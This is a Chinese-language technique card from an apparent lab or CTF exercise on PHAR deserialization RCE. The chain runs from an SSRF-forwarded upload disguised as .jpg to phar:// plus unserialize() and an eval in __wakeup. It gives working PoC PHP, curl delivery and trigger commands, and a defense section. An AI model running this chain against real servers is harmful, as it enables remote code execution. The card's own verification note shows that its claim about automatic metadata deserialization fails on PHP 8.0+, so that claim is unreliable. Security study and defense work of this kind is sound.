---
id: web-php-deserialization-phar-upload-jpg-wakeup-eval
title: PHAR 反序列化：任意后缀上传文件经 phar:// 触发 __wakeup eval RCE
type: scenario
domain: web
path: web/php/deserialization
technique: phar-wrapper-upload-deserialization
aliases:
- PHAR 反序列化
- phar:// 触发反序列化
- 上传 jpg 触发 phar
- CustomTemplate __wakeup eval
- PHAR metadata 反序列化
- 任意后缀 PHAR
tags:
- php
- phar
- deserialization
- file-upload
- ssrf
- rce
- wakeup
- eval
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V64
  verified_at: '2026-11-05T12:15:31+08:00'
  notes: 已对照原文与图01-10核对：sku_url.php SSRF 访问 127.0.0.1:4455 取得内部 API（图03）；21959 直连 sku_transfer/sku_validation/sku_read（图04/05）；backup.zip 含 read_sku.php/ReadClass.php/sku_process.php（图06）；PHAR 由 PHP 5.3.29 生成（图07）、base64（图08）、经 SSRF 转发 sku_process 落 /tmp/76d7...jpg（图09）、read_sku 触发后回显 flag（图10）。read_sku 的 phar://+unserialize(manifest)+CustomTemplate::__wakeup eval 与原文源码一致。问题：卡内“PHAR metadata 在 phar:// 打开时自动反序列化、双保险”在 PHP 8.0+ 不成立（PHP 8.0 起 Phar metadata 不再自动反序列化），目标正是 PHP 8.0.30；实际利用依赖显式 unserialize(manifest)，建议作者删除/限定该句。未验证点：PoC 未本机复跑；目标为授权的 ulab 环境，无版本区间。
---

## 一句话结论

当应用把用户上传内容写入任意后缀文件（如 `/tmp/{md5}.jpg`），并在另一处用 `file_get_contents("phar://" . $path . "/manifest")` 或 `unserialize()` 处理该路径时，PHAR 容器不依赖 `.phar` 后缀也会被 `phar://` 解析；攻击者把带恶意 metadata/manifest 的 PHAR 伪装成 jpg 上传，再触发 phar://，即可让 `__wakeup()` 中的 `eval()` 执行任意代码。

## 原理

- PHAR 是 PHP 的容器格式，`phar://` 包装器按文件内容（stub 中的 `__HALT_COMPILER();` 与 manifest 结构）识别容器，不要求 `.phar` 扩展名；因此 `phar:///tmp/xxx.jpg/manifest` 仍会按 PHAR 解析。
- 攻击链的上传点 `sku_process.php` 接收 base64 的 `data`，解码后写入 `/tmp/{md5(uniqid())}.jpg`，返回 `file_path`；内容与后缀完全由服务端生成，攻击者只控制字节。
- 触发点 `read_sku.php` 接收 `file_path`，执行 `file_get_contents("phar://" . $filePath . "/manifest")`，把读到的内容 `unserialize()`，随后 `new CustomTemplate()->render($data)`。
- Gadget `CustomTemplate` 的 `__wakeup()` 直接 `eval($this->data)`；`unserialize()` 时会自动调用 `__wakeup()`，因此 manifest 中序列化的对象一旦被反序列化就执行 `eval`。
- 即使应用不显式 `unserialize()` manifest 内容，PHAR 的 metadata 在 `phar://` 打开时也会触发反序列化（经典 PHAR deserialization）；本例同时设置了 metadata 与 manifest，双保险。
- 为什么需要 SSRF：内部 API 的 `/sku_process` 只监听 `127.0.0.1:4455`，外部不可达；`sku_url.php` 是 URL 抓取器，可把 POST 的 `url` 与 `data` 转发到内部 API，形成“SSRF 作为写文件原语”的投递链。Nginx 21959 又把所有路径反向代理到内部 API，使 `read_sku.php` 可从外部触发。
- 生成 PHAR 需要本地 PHP 环境（`phar.readonly=Off`）；也可用 Python 手工拼 PHAR 字节（stub + manifest + SHA1 签名 + `GBMB` 魔数），不依赖 PHP。

## 触发条件

- 存在“任意内容写入任意后缀文件”的上传/写文件功能，且返回可预测或可获取的文件路径。
- 存在用 `phar://` 打开用户可控路径的功能，或对用户可控文件内容执行 `unserialize()`。
- 代码中存在可利用的 gadget（如 `__wakeup`/`__destruct` 中的 `eval`、文件写、命令执行）。
- 攻击者能生成 PHAR 并投递到目标可读路径；若上传点仅内网可达，需要 SSRF/代理等转发能力。

## 利用步骤

1. 通过源码泄露、报错或备份文件定位上传点与触发点，确认上传内容可控、触发路径可控。
2. 在本地构造 PHAR：设置 stub 以 `__HALT_COMPILER(); ?>` 结尾，把序列化的 gadget 放入 metadata 和/或 `manifest` 文件。
3. 将 PHAR 做 base64 编码；通过 SSRF 端点把 `data` 转发到内部 `/sku_process`，拿到返回的 `/tmp/{md5}.jpg` 路径。
4. 通过外部可达的代理/入口调用 `read_sku.php`，`file_path` 填上一步的路径。
5. `phar://` 解析 PHAR，`unserialize()` 触发 gadget 的 `__wakeup()`，执行 `eval` 中的命令；观察响应或回连确认 RCE。
6. 若目标禁用 `phar://`，尝试其他反序列化入口；若上传后缀被限制，确认是否可用 `.jpg`、`.png` 等任意后缀承载 PHAR。

## PoC

```php
<?php
// 本地生成 PHAR（phar.readonly=Off）
class CustomTemplate {
    public $template;
    public $data;
    public function __wakeup() { eval($this->data); }
    public function render() { eval($this->data); }
}

$pharFile = 'exploit.phar';
@unlink($pharFile);
$obj = new CustomTemplate();
$obj->data = 'system("cat /flag.txt");';
$manifestContent = serialize($obj);

$phar = new Phar($pharFile, 0, 'exploit.phar');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($obj);
$phar->addFromString('manifest', $manifestContent);
```

```bash
# 1) base64 编码 PHAR
PAYLOAD=$(base64 -w0 exploit.phar)

# 2) 通过 SSRF 转发到内部上传接口
curl -s -X POST "http://target:21960/sku_url.php" \
  --data-urlencode "url=http://127.0.0.1:4455/sku_process" \
  --data-urlencode "data=${PAYLOAD}"
# 返回 {"file_path":"/tmp/<md5>.jpg",...}

# 3) 通过外部代理触发 phar:// 与反序列化
curl -s -X POST "http://target:21959/read_sku.php" \
  --data-urlencode "file_path=/tmp/<md5>.jpg"
# 返回命令执行结果
```

```text
POST /sku_process.php  → 上传 PHAR → /tmp/{md5}.jpg
POST /read_sku.php     → phar:///tmp/{md5}.jpg/manifest
                       → unserialize() → CustomTemplate::__wakeup()
                       → eval("system('cat /flag.txt');") → RCE
```

## 变体与关联

- 变体：不依赖显式 `unserialize()`，只把恶意对象放进 PHAR metadata，通过任意 `phar://` 文件操作（`file_exists`、`filesize`、`getimagesize` 等）触发 metadata 反序列化。
- 变体：用 Python 手工构造 PHAR 字节（stub + manifest + SHA1 签名 + `GBMB`），适用于没有 PHP 环境或需要精确控制字节的场景。
- 变体：上传后缀为 `.jpg`、`.png`、`.gif` 均可，`phar://` 只看内容；若上传点校验图片头，可在 PHAR 前拼接合法图片头或使用 polyglot。
- 变体：SSRF 作为写文件原语，把 base64 内容 POST 到内部 API；同类“SSRF 转发 POST”也可用于内部其它写接口。
- 关联：[[web-php-deserialization-compressed-phar-include-bypass]]（压缩 PHAR 经 include 解析，触发方式不同）；[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（魔术方法链到 eval）；[[web-generic-ssrf-avatar-urlopen-internal-service]]（SSRF 访问内部服务）。
- 边界：目标禁用 `phar://`、上传内容被重新编码/压缩、触发路径不可控、或 gadget 被移除时，本手法不成立。

## 检测与防御

- 检测：上传文件中出现 PHAR 魔数/`__HALT_COMPILER();` 结构，即使后缀是 jpg/png；请求路径或参数中出现 `phar://`；对用户可控文件执行 `unserialize()` 的行为。
- 检测：内部 API 收到来自应用服务器的异常 POST（base64 大文件写入 /tmp）；外部入口访问内部管理/调试脚本（如 `read_sku.php`）。
- 防御：禁用 `phar://` 包装器（或至少禁止对上传目录使用）；不要对用户可控内容执行 `unserialize()`，改用 JSON/白名单格式。
- 防御：移除 gadget 中的 `eval`/命令执行；上传文件重命名并做内容魔数校验，上传目录不可执行且不可被 `phar://` 解析。
- 加固：内部 API 只允许可信来源访问，SSRF 入口做目标白名单与出站限制；Nginx 不要把所有路径无条件反代到内部 API；把 `phar.readonly=On` 作为默认。
